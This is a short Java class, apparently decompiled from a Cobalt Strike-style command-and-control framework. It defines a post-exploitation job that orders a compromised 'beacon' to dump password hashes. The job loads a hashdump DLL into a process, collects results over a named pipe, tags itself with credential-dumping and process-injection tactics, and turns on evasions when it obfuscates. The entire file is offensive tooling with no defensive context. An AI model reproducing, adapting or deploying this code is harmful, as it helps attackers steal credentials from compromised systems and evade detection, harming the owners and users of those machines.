package beacon.jobs;

import beacon.Job;
import beacon.TaskBeacon;
import pe.PostExObfuscator;

public class HashdumpJob extends Job {
   public HashdumpJob(TaskBeacon var1) {
      super(var1);
   }

   public String getDescription() {
      return "Tasked beacon to dump hashes";
   }

   public String getShortDescription() {
      return "dump password hashes";
   }

   public String getDLLName() {
      return this.arch.equals("x64") ? "resources/hashdump.x64.dll" : "resources/hashdump.dll";
   }

   public String getPipeName() {
      return "hashdump";
   }

   public String getTactic() {
      return "T1003, T1055";
   }

   public int getCallbackType() {
      return 21;
   }

   public int getWaitTime() {
      return 15000;
   }

   public void obfuscate(PostExObfuscator var1, byte[] var2) {
      var1.enableEvasions();
   }
}
